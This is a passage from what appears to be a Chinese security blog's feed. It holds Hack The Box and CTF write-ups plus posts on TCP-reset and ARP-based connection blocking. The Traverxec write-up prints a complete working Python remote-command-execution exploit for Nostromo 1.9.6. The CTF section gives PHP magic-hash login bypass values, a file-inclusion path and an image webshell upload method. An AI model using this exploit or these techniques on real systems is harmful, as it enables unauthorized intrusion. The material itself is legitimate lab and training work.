src="/img/Postman/Postman7.png"></p><p>猜测这是Matt用户的ssh登录凭证，同样使用john爆破密码，具体操作参考<a href="https://coldwave96.github.io/2019/12/17/Traverxec/">Traverxec</a>，最终可以得到密码。</p><p>不过这次无法通过ssh密钥登陆，可能是靶机做了限制。然后我直接尝试了下用这个密码su Matt账户就成功切换到了Matt账户，然后在根目录下就可以获得user.txt。</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>使用<a href="https://github.com/rebootuser/LinEnum">LinEnum脚本</a>提权，即可在root根目录下找到root.txt。</p><p>其实root权限还有其他方法，还记得10000端口的webmin服务么，Matt用户以及刚才破解出来的密码配MSF中的webmin漏洞利用模块即可获取root用户权限的shell，然后在根目录下即可找到root.txt。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hack The Box - Traverxec の Write-Up</title>
      <link href="/2019/12/17/Traverxec/"/>
      <url>/2019/12/17/Traverxec/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Hack The Box是一个非常完备的渗透测试训练靶场，比较接近于实战，许多机器存在不小的难度。不过美中不足的一是会员价格太贵，二是需要通过VPN接入实验网络，然而国内连接实在是有点慢，特别是晚上网络高峰期，各种连接失败不在话下。</p><p>这两天玩了<a href="https://www.hackthebox.eu/home/machines/profile/217">Traverxec</a>这台靶机，相较而言是一个很简单的机器了，但是也学到了不少东西。</p><p><img src="/img/Traverxec/Traverxec1.png"></p><span id="more"></span><h2 id="Step-1：扫描"><a href="#Step-1：扫描" class="headerlink" title="Step 1：扫描"></a>Step 1：扫描</h2><p>第一步当然是常规的Nmap扫描：</p><p><img src="/img/Traverxec/Traverxec2.png"></p><p>可以看到靶机只开放了22和80两个端口。</p><h2 id="Step-2：渗透"><a href="#Step-2：渗透" class="headerlink" title="Step 2：渗透"></a>Step 2：渗透</h2><p>从Nmap扫描结果来看80端口开放的是Nostromo 1.9.6服务，网站页面本身并不能找到什么可以利用的漏洞。</p><p><img src="/img/Traverxec/Traverxec3.png"></p><p>emmm，David是个信息点。</p><p>Web界面上找不到什么好玩的东西了，既然我们有了Nostromo的具体版本号，那就去搜索一下有没有可以利用的漏洞：</p><p><img src="/img/Traverxec/Traverxec4.png"></p><p>不搜不知道，一搜吓一跳，第一条就是最喜欢的远程命令执行漏洞。下面给出EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;RCE in Nostromo web server through 1.9.6 due to path traversal.&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;host&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;domain/IP of the Nostromo web server&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;port&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;port number&#x27;</span>,<span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;cmd&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;command to execute, default is id&#x27;</span>,default=<span class="string">&#x27;id&#x27;</span>,nargs=<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">s</span>):</span><br><span class="line">r=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">t=s.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(t)==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r+=t</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">return</span> r</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">host,port,cmd</span>):</span><br><span class="line">s=socket.socket()</span><br><span class="line">s.settimeout(<span class="number">1</span>)</span><br><span class="line">s.connect((host,<span class="built_in">int</span>(port)))</span><br><span class="line">payload=<span class="string">&quot;&quot;&quot;POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0\r\nContent-Length: 1\r\n\r\necho\necho\n&#123;&#125; 2&gt;&amp;1&quot;&quot;&quot;</span>.<span class="built_in">format</span>(cmd)</span><br><span class="line">s.send(payload)</span><br><span class="line">r=recv(s)</span><br><span class="line">r=r[r.index(<span class="string">&#x27;\r\n\r\n&#x27;</span>)+<span class="number">4</span>:]</span><br><span class="line"><span class="built_in">print</span> r</span><br><span class="line"></span><br><span class="line">exploit(args.host,args.port,args.cmd)</span><br></pre></td></tr></table></figure><p>运行脚本即可获得反弹shell：</p><p><img src="/img/Traverxec/Traverxec5.png"></p><p><img src="/img/Traverxec/Traverxec6.png"></p><p>显然得到的是一个非交互shell，通过熟悉的命令可得到交互式shell，不熟悉的可以去看我之前DC系列靶机的Write-Ups。</p><h2 id="Step-3：突破"><a href="#Step-3：突破" class="headerlink" title="Step 3：突破"></a>Step 3：突破</h2><p>此时在目录下可以找到Nostromo服务的配置文件：</p><p><img src="/img/Traverxec/Traverxec7.png"></p><p>在配置文件中发现存在Public文件夹public_www。但是尝试进入&#x2F;home&#x2F;david文件夹后提示权限禁止。</p><p><img src="/img/Traverxec/Traverxec8.png"></p><p>于是不管这一层，直接进入public_www文件夹：</p><p><img src="/img/Traverxec/Traverxec9.png"></p><p>果然在这个文件夹里发现了好东西，看名字就是ssh的登录凭证，后面的思路一下就有了。但是有个问题，怎么把这个文件下载到本地呢？</p><p><img src="/img/Traverxec/Traverxec10.png"></p><p><img src="/img/Traverxec/Traverxec11.png"></p><p>巧妙的通过base方法即可实现该文件的下载，快拿小本本记一下。解压这个文件，果然是ssh登录凭证。</p><p><img src="/img/Traverxec/Traverxec12.png"></p><p>但是尝试通过这个凭证登录时提示需要使用凭证的密码，这时候只有通过john工具来暴力破解了。<a href="https://blog.csdn.net/qq_40490088/article/details/97812715">这里</a>对这种方法有详细的解释。</p><p><img src="/img/Traverxec/Traverxec13.png"></p><p><img src="/img/Traverxec/Traverxec14.png"></p><p><img src="/img/Traverxec/Traverxec15.png"></p><p>这样我们就得到了ssh凭证的密码：hunter。结合Web页面得到的david信息点，我们通过ssh登录靶机：</p><p><img src="/img/Traverxec/Traverxec16.png"></p><h2 id="Step-4：提权"><a href="#Step-4：提权" class="headerlink" title="Step 4：提权"></a>Step 4：提权</h2><p>我们已经以david的身份登录了靶机，下一步就是尝试提权获取靶机root权限。在当前文件夹下发现一个奇怪的目录bin，进去之后看到一个服务的脚本，好奇心促使我看了一眼：</p><p><img src="/img/Traverxec/Traverxec17.png"></p><p>果然有猫腻，这个服务居然有root权限。ok，轻松提权：</p><p><img src="/img/Traverxec/Traverxec18.png"></p><p>至此，这个靶机算是完全被我们掌控。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> Hack The Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF答题夺旗赛（第三季）WriteUPs</title>
      <link href="/2019/12/02/NestCTF3/"/>
      <url>/2019/12/02/NestCTF3/</url>
      
        <content type="html"><![CDATA[<p>前几天参加了由<a href="https://nest.ichunqiu.com/">网络内生安全试验场</a>（Network Endogens Security Testbed，NEST）举办的CTF答题夺旗赛（第三季）。题目整体比较简单，简单的写一下WriteUPs。</p><span id="more"></span><h2 id="weak"><a href="#weak" class="headerlink" title="weak"></a>weak</h2><p>打开后就是一个某公司网站:</p><p><img src="/img/NestCTF3/NestCTF3-1.png"></p><p>只有一个管理平台可以点击，之后进入用户管理平台：</p><p><img src="/img/NestCTF3/NestCTF3-2.png"></p><p>点击跳转到测试页发现一段源码如下图所示：</p><p><img src="/img/NestCTF3/NestCTF3-3.png"></p><p>看过源码再结合题目名字weak，很显然就是一个php弱等于的问题：php中有两种比较的符号 &#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D; ，&#x3D;&#x3D;&#x3D; 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较&#x3D;&#x3D; 在进行比较的时候，会先将字符串类型转化成相同，再比较, 如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。”0e132456789” &#x3D;&#x3D; “0e7124511451155”中 2 个数的值都是 0 因而就相等了。如果不满足0e\d+这种模式就不会相等。</p><p>首先是判断是否通过POST传入username和password两个数据，如果传入了就进行下面的判断，看到最下面，如果logined为TRUE就输出flag，所以需要使前两个if里面的结果为False，第三个if里的结果为True。</p><p>第一个判断中的ctype_alpha函数是做纯字符检测 ， 如果在当前语言环境中传入参数里的每个字符都是一个字母，那么就返回TRUE，反之则返回FALSE，然后前面有一个!所以username需要传入 的全部是字母。</p><p>第二个判断中的is_numeric函数是检测变量是否为数字或数字字符串，如果是数字和数字字符串则返回 TRUE，否则返回 FALSE。 所以password需要传入纯数字。</p><p>第三个判断的意思是username和password两个的md5值相同，但是两者本身不同，用到的就是刚开始说的php弱等于，下面是一些收集到的md5加密后为0e开头的字符串:</p><p>纯字母：</p><table><thead><tr><th align="center">明文</th><th align="center">密文</th></tr></thead><tbody><tr><td align="center">UYXFLOI</td><td align="center">0e552539585246568817348686838809</td></tr><tr><td align="center">PJNPDWY</td><td align="center">0e291529052894702774557631701704</td></tr><tr><td align="center">DYAXWCA</td><td align="center">0e424759758842488633464374063001</td></tr></tbody></table><p>纯数字：</p><table><thead><tr><th align="center">明文</th><th align="center">密文</th></tr></thead><tbody><tr><td align="center">571579406</td><td align="center">0e972379832854295224118025748221</td></tr><tr><td align="center">3465814713</td><td align="center">0e258631645650999664521705537122</td></tr><tr><td align="center">5432453531</td><td align="center">0e512318699085881630861890526097</td></tr></tbody></table><p>通过上面的表，用户名输入UYXFLOI，密码输入571579406，就可以获得flag。</p><p><img src="/img/NestCTF3/NestCTF3-4.png"></p><h2 id="md5-brute"><a href="#md5-brute" class="headerlink" title="md5_brute"></a>md5_brute</h2><p>打开之后一步一步跟着文本的指导，就可以得到flag。</p><p><img src="/img/NestCTF3/NestCTF3-5.png"></p><h2 id="help"><a href="#help" class="headerlink" title="help"></a>help</h2><p>打开之后是和weak差不多的某公司网站，只有页面上的“帮助”点击之后有反应，一看地址栏是<a href="http://120.55.43.255:17325/?file=help.php%EF%BC%8C">http://120.55.43.255:17325/?file=help.php，</a> 很轻易的就能联想到file参数可能存在文件包含漏洞，经过测试果然存在本地文件包含。</p><p>在首页查看源代码，在最底部找到这样的提示：</p><p><img src="/img/NestCTF3/NestCTF3-6.png"></p><p>所以提交file&#x3D;..&#x2F;..&#x2F;flag即可获得flag。</p><p><img src="/img/NestCTF3/NestCTF3-7.png"></p><h2 id="word"><a href="#word" class="headerlink" title="word"></a>word</h2><p>这可能是最有（wu）趣（liao）的题目了，一个加密的word文件，密码在题目中告诉你了，然后就没有然后了。</p><p>最开始我还以为给出的flag是某一种算法加密后的，后来……</p><p>好吧，出题人你赢了&#x3D;&#x3D;</p><h2 id="search"><a href="#search" class="headerlink" title="search"></a>search</h2><p>还是熟悉的某公司网站，搜索框随便输个数字，得到这样一个页面：</p><p><img src="/img/NestCTF3/NestCTF3-8.png"></p><p>再看一下网址：<a href="http://120.55.43.255:11777/search.php?id=1%EF%BC%8Cid%E5%8F%82%E6%95%B0%E5%BF%85%E7%84%B6%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E3%80%82%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%96%B9%E6%B3%95%E9%9A%8F%E4%BE%BF%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%88%96%E8%80%85sqlmap%E9%83%BD%E5%8F%AF%E4%BB%A5%E8%BD%BB%E6%9D%BE%E7%9A%84%E6%90%9E%E5%AE%9A%E3%80%82">http://120.55.43.255:11777/search.php?id=1，id参数必然存在注入漏洞。下面的方法随便手工注入或者sqlmap都可以轻松的搞定。</a></p><h2 id="encrypt"><a href="#encrypt" class="headerlink" title="encrypt"></a>encrypt</h2><p>打开之后是这样一段数字和字母：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">69725f765f61797d74797465667321275f6f5f6c796573655f746121615f61736867655376736f697b417965796c73457321</span><br></pre></td></tr></table></figure><p>这是一段hex编码的字符串，揭开之后是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ir_v_ay&#125;tytefs!&#x27;_o_lyese_ta!a_ashgeSvsoi&#123;AyeylsEs!</span><br></pre></td></tr></table></figure><p>显然已经出来了，只剩最后一步。这是栅栏密码，经过尝试，发现为7个一组，解码之后可以得到flag。</p><h2 id="唱跳rap篮球"><a href="#唱跳rap篮球" class="headerlink" title="唱跳rap篮球"></a>唱跳rap篮球</h2><p>emmmmm，最无语的题。打开就是个登陆界面，查看源码发现最后由这样的提示：</p><p><img src="/img/NestCTF3/NestCTF3-9.png"></p><p>所以怎么办呢，caixukun&#x2F;19980802登陆就可以获得flag：</p><p><img src="/img/NestCTF3/NestCTF3-10.png"></p><p>emmmmm，除了无语还是无语……</p><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>又是编码题，打开之后又是一堆奇怪的数字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9a9a9a6a9aa9656699a699a566995956996a996aa6a965aa9a6aa596a699665a9aa699655a696569655a9a9a9a595a6965569a59665566955a6965a9596a99aa9a9566a699aa9a969969669aa6969a9559596669</span><br></pre></td></tr></table></figure><p>最奇怪的是只有5，6，9，a这4种字符，找了很久，这居然是曼彻斯特编码，还是差分曼彻斯特编码：5:0101；6:0110；9:1001；a：1010。然后转换为16进制，再转换成字符串即可获得flag。</p><p>具体的可以看<a href="http://antcave.cn/archives/400">这里</a>。</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>打开之后是一个简单的上传界面，只能上传png格式的文件，且验证过程是在后台进行，所以无法绕过。查看源码，发现一个有趣的首页图片地址：(这题刚开始没多久就已经被师傅们玩坏了，没有截图，只能自己想象了)</p><p><a href="http://120.55.43.255:11881/include.php?file=dXBsb2Fk">http://120.55.43.255:11881/include.php?file=dXBsb2Fk</a></p><p>file提交的参数经过base64解码之后结果是upload。有趣，上传的图片文件名会被base64编码。但是当我们通过file参数提交上传的图片名base64编码后的字符串之后，可以访问图片，且图片文件被解析成脚本。</p><p>分析清楚之后，那接下来就很简单了，创建一个一句话的图片马，上传之后用蚁剑去连接，flag文件就在根目录下。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>关于PWN和逆向的题，别问，问就是简（bu）单（hui），不（xu）值（yao）一（xue）提（xi）。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NEST </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现TCP旁路阻断</title>
      <link href="/2019/12/02/TcpRst/"/>
      <url>/2019/12/02/TcpRst/</url>
      
        <content type="html"><![CDATA[<h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h2><p>TCP旁路阻断技术通过监听通信信道，抓包还原TCP协议，然后通过给通信两方发送TCP Reset包实现旁路阻断TCP连接。</p><p>Python中可通过Raw Socket进行以太网嗅探和发送Reset包。</p><span id="more"></span><h2 id="2-Raw-Socket"><a href="#2-Raw-Socket" class="headerlink" title="2 Raw Socket"></a>2 Raw Socket</h2><p>Raw Socket提供一种方法来绕过整个网络堆栈遍历和直接将以太网帧数据送到一个应用程序。</p><p>有很多种方法来创建raw sockets，例如AF_INET，PF_INET，AF_PACKET，PF_PACKET等。相互之前的区别在于AF_INET和PF_INET只能到网络7层模型的网络层，而AF_PACKET和PF_PACKET可以到MAC层，即数据链路层。</p><h3 id="2-1传输层"><a href="#2-1传输层" class="headerlink" title="2.1传输层"></a>2.1传输层</h3><p>最简单的传输层socket就是最常用的socket，而非raw socket。建立方式为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sockfd = socket(AF_INET,SOCK_STREAM/SOCK_DGRAM, protocol)</span><br></pre></td></tr></table></figure><p>收发数据用于TCP和UDP协议，发送和接收的数据都不包含UDP头或TCP头，使用ip地址+端口号作为地址。</p><h3 id="2-2网络层"><a href="#2-2网络层" class="headerlink" title="2.2网络层"></a>2.2网络层</h3><p>建立方式为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sockfd = socket(AF_INET,SOCK_STREAM/SOCK_DGRAM, protocol)</span><br></pre></td></tr></table></figure><p>第一个参数：PF_INET&#x2F;AF_INET。二者的的区别为指定address family时一般设置为AF_INET，即使用IP；指定protocal family时一般设置PF_INET。在头文件中有如下定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define AF_INET 0</span><br><span class="line">#define PF_INET AF_INET</span><br></pre></td></tr></table></figure><p>所以AF_INET与PF_INET完全一样；</p><p>第二个参数说明建立的是一个raw socket；</p><p>第三个参数分为3种情况：</p><ul><li><p>a.参数protocol用来指明所要接收的协议号，如果是象IPPROTO_TCP(6)这种非0，非255号的协议，则内核碰到ip头中protocol域和创建socket所使用参数protocol相同的IP包，就会交给这个rawsocket来处理。</p></li><li><p>b.如果protocol是IPPROTO_RAW(255)，这个socket只能用来发送IP包，而不能接收任何数据.发送的数据需要自己填充IP包头，并且自己计算校验和。</p></li><li><p>c.如果protocol是IPPROTO_IP(0)，在linux和sco unix上是不允许建立的。</p></li></ul><p>网络层raw socket的特点为该套接字可以接收协议类型为(icmp，igmp等)发往本机的ip数据包；不能收到非发往本地ip的数据包(ip软过滤会丢弃这些不是发往本机ip的数据包)；不能收到从本机发送出去的数据包；发送时需要自己组织tcp，udp，icmp等传输层协议头部，可以setsockopt来自己包装ip头部；接收的UDP和TCP协议号的数据不会传给任何原始套接字接口，UDP和TCP协议的数据需要通过MAC层原始套接字来获得。</p><h3 id="2-3数据链路层"><a href="#2-3数据链路层" class="headerlink" title="2.3数据链路层"></a>2.3数据链路层</h3><p>建立方式为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP/ETH_P_ARP/ETH_P_ALL))</span><br></pre></td></tr></table></figure><p>发送和接收数据使用MAC地址，可以在MAC层发送和接收任意的数据，如果有上层协议需要自行添加协议头。</p><p>第三个参数protocol协议类型一共有四个：</p><ul><li><p>ETH_P_IP 0x800 只接收发往本机mac的ip类型的数据帧；</p></li><li><p>ETH_P_ARP 0x806 只接受发往本机mac的arp类型的数据帧；</p></li><li><p>ETH_P_ARP 0x8035 只接受发往本机mac的rarp类型的数据帧；</p></li><li><p>ETH_P_ALL 0x3 接收发往本机mac的所有类型ip，arp，rarp的数据帧, 接收从本机发出的所有类型的数据帧.(混杂模式打开的情况下,会接收到非发往本地mac的数据帧)。</p></li></ul><p>需要注意的是这一种socket使用的收发地址都是通过指定网卡实现，接受和发送的数据都是数据帧，格式如下：</p><hr><pre><code>    |eth header|             data          |</code></pre><hr><p>即： </p><hr><pre><code>|MACdesAddr(6)|MACsrcAddr(6)|protocal(2)|        data      |</code></pre><hr><p>综述MAC层socket可以接收发往本地mac的数据帧；可以接收从本机发送出去的数据帧(第3个参数需要设置为ETH_P_ALL)；可以接收非发往本地mac的数据帧(网卡需要设置为promisc混杂模式)。</p><h2 id="3-具体实现"><a href="#3-具体实现" class="headerlink" title="3 具体实现"></a>3 具体实现</h2><h3 id="3-1原理"><a href="#3-1原理" class="headerlink" title="3.1原理"></a>3.1原理</h3><p>把任意的TCP连接给Reset掉是比较容易的，因为TCP在收到数据包时，对发送者仅仅做以下简单的校验：五元组校验；校验和检测；序列号校验。如此松散的校验机制很容易就可以pass。</p><p>包构造的原理图如下图所示：</p><p><img src="/img/TcpRst/TcpRst1.png"></p><h3 id="3-2实现"><a href="#3-2实现" class="headerlink" title="3.2实现"></a>3.2实现</h3><p>首先创建raw socket连接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">listen</span>():</span><br><span class="line">    listen_socket = socket.socket(</span><br><span class="line">        socket.AF_PACKET,</span><br><span class="line">        socket.SOCK_RAW,</span><br><span class="line">        socket.ntohs(<span class="number">0x0003</span>)</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>然后监听网卡，接收数据，解析数据帧，寻找tcp协议的数据帧，放弃掉原本的RST包以及FIN包，然后判断ip地址是否在黑名单中:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> sender <span class="keyword">in</span> addresses:</span><br><span class="line">    <span class="keyword">if</span> sender <span class="keyword">not</span> <span class="keyword">in</span> stats[<span class="string">&quot;seen&quot;</span>]:</span><br><span class="line">        stats[<span class="string">&quot;seen&quot;</span>].append(sender)</span><br><span class="line"><span class="keyword">elif</span> receiver <span class="keyword">in</span> addresses:</span><br><span class="line">    <span class="keyword">if</span> receiver <span class="keyword">not</span> <span class="keyword">in</span> stats[<span class="string">&quot;seen&quot;</span>]:</span><br><span class="line">        stats[<span class="string">&quot;seen&quot;</span>].append(receiver)</span><br></pre></td></tr></table></figure><p>如果检测到禁止的tcp连接，就会给连接双方均发送TCP Reset包断开连接，实现tcp旁路阻断的功能。</p>]]></content>
      
      
      <categories>
          
          <category> Program </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> By-pass Block </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>旁路阻断技术</title>
      <link href="/2019/12/02/SideBlock/"/>
      <url>/2019/12/02/SideBlock/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>旁路阻断是通过旁路监听通信数据，然后进行协议还原，根据内容进行阻断。这类技术的优点是不影响互联网访问的速度，并且对用户没有特殊的设置要求。通俗讲是并联在互联网的出口上，不会影响原来网络的稳定性，部署也很方便。</p><p>采用旁路的方式管理网络并阻断非法连接的方法可以分为三类：</p><ul><li><p>通过与网关产品联动，建立临时规则</p></li><li><p>进行基于ARP的阻断方式</p></li><li><p>发送TCP Reset包</p></li></ul><span id="more"></span><h2 id="与网关产品联动"><a href="#与网关产品联动" class="headerlink" title="与网关产品联动"></a>与网关产品联动</h2><p>通过与网关产品的联动方式主要是向防火墙发送临时规则，以及路由器或交换机发送临时ACL列表，阻断当前这个会话。</p><p>这种方式存在着这么几个方面的问题：</p><p>1、首先是联动协议问题。“联动”一直是网络安全界中的一个很时髦的概念，虽然已经有五六年的历史，但是到目前为止，还远远没有得到充分的发展。现在联动得实现是以现有得某个厂家为核心，其他厂家的产品在一些半公开的SDK的支持下实现与核心厂家的某个产品实现互联。这样导致现有和多产品有联动功能，但是没有联动得实际效果。</p><p>2、联动信息的滞后。即使产品与防火墙有着优良的联动相应方式，IDS产品在检测得过程中发现了非法得连接，生成一条临时规则发送到防火墙，防火墙应用这条规则阻断这个连接;在这一个过程中存在着三个延时，一、IDS发现非法连接，生成临时规则;二、规则传输给防火墙;三、防火墙应用规则。这三个演示得总时间最好情况下是小于两秒，而且这个过程当中IDS的检测是滞后IDS检测到非法连接时，这个连接已经建立了，如果这个连接时蠕虫，或木马，两秒的延时足够成功攻击了。</p><p>3、当遇到大规模的非法连接的时候，IDS会针对每一条会话向防火墙添加临时规则，这样势必造成防火墙临时规则增大，降低防火墙的效率，引起防火墙包转发延时，严重造成防火墙瘫痪，网络中断。</p><h2 id="基于ARP的阻断"><a href="#基于ARP的阻断" class="headerlink" title="基于ARP的阻断"></a>基于ARP的阻断</h2><p>基于arp的阻断共有三种方式：ARP 欺骗、ARP 投毒和 ARP 攻击。</p><p>先了解ARP的原理。ARP 用于将 IP 地址匹配到或解析至恰当的 MAC 地址，所有的网络设备都有一张 ARP 表，里面临时记忆着该设备已经匹配起来的所有的 IP 地址和 MAC 地址。ARP 表能够确保该设备不需要向已经与自己进行过通信的计算机重复 ARP 询问。当有人在未获得授权时就企图更改 MAC 和 IP 地址的 ARP 表格中的信息时，就发生了 ARP 攻击。通过这种方式我们可以伪造ARP应答包，使得非法连接主机的ARP表错误，无法连接到网关，从而阻断连接。</p><p>这种阻断方式从效果上讲是很强力，但是同时也造成了一个问题，其不但阻止了非法连接，而且也阻断了合法连接，这对于网络中的正常应用有着很大的影响。</p><h2 id="TCP-Reset"><a href="#TCP-Reset" class="headerlink" title="TCP Reset"></a>TCP Reset</h2><p>以IDS为例，IDS设备是一个典型的旁路监听并通过TCP Reset进行阻断的网络安全设备。IDS TCP Reset实现方法，当IDS发现一条非法的连接IDS将会向通信的两端各发送一个TCP RESET包，从而实现主动切断连接的目的，此时通信双方的堆栈将会把这个RESET包解释为另一端的回应，然后停止整个通信过程，释放缓冲区并撤销所有TCP状态信息。这个时候，攻击数据包可能还在目标主机操作系统TCP&#x2F;IP堆栈缓冲区中，没有被提交给应用程序，由于缓冲区被清空了，所以攻击不会发生。</p><p>对于RESET包来说，IDS发出的RESET包的前提是知道整个会话当前的序列号和确认号，否则这个RESET包将会被忽略。我们假定一个会话得确认号必须为152如果你发送的RESET包的确认号为142，那么堆栈将会认为这是一个无效的数据包或者被破坏的数据包而将它忽略掉。</p><p>从另一方面讲所有的IDS在响应攻击时都有延迟时间，因为IDS从抓取数据包，监测攻击，产生RESET包，到最后发出RESET整个过程都要消耗一定的时间。很多的IDS使用libpcap库来抓包，大部分IDS构建在类BSD的系统上，BSD系统下是利用BPF(Berkeley Packet Filters)进行抓包，BPF默认将会开一个很大的缓冲区，在一个典型的网络中，IDS发出RESET包的过程大约会延迟半秒。在Linux和Solaris平台上，性能要稍微好一点，但是肯定也有延迟时间。</p><p>而且TCP Reset对于网络应用来说也有着很大的局限性，其只能针对通常得标准TCP连接发送阻断信息，对于UDP会话无能为力。再则目前得一些网络应用软件在会话连接保持上都很强得能力，TCP Reset包对于他们的效果基本可以忽略。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上所述，想要实现旁路阻断，与网关产品联动和TCP Reset包是两种比较靠谱的方法。但是同时两种方法都存在自己的问题，目前最常用的是TCP Reset包技术实现TCP旁路阻断，且文中提到的主要缺陷也是可以解决的。</p>]]></content>
      
      
      <categories>
          
          <category> Theories </category>
          
          <category> Products </category>
          
      </categories>
      
      
        <tags>
            
            <tag> By-pass Block </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub - DC-4 の Write-Up</title>
      <link href="/2019/11/20/DC-4/"/>
      <url>/2019/11/20/DC-4/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><a href="https://www.vulnhub.com/">Vulnhub</a>之DC系列靶机<a href="http://www.five86.com/downloads/DC-4.zip">DC-4</a>的Write-up。</p><span id="more"></span><h2 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h2><p>扫描找靶机IP+扫描靶机端口找服务老套路，这次没有设置奇怪的端口。</p><p><img src="/img/DC-4/DC-4-1.png"></p><p><img src="/img/DC-4/DC-4-2.png"></p><h2 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h2><p>访问80端口的Web服务是一个简单的登录框。以为登录框会有注入漏洞啥的，首先扫了一下网站目录结构，没有任何发现。然后用nikto帮助找一下思路，还是一无所获。</p><p><img src="/img/DC-4/DC-4-3.png"></p><p>难道是SQL注入？尝试了万能密码，手动注入，还用SQLMAP跑了一下，果然全是空。</p><p><img src="/img/DC-4/DC-4-4.png"></p><h2 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 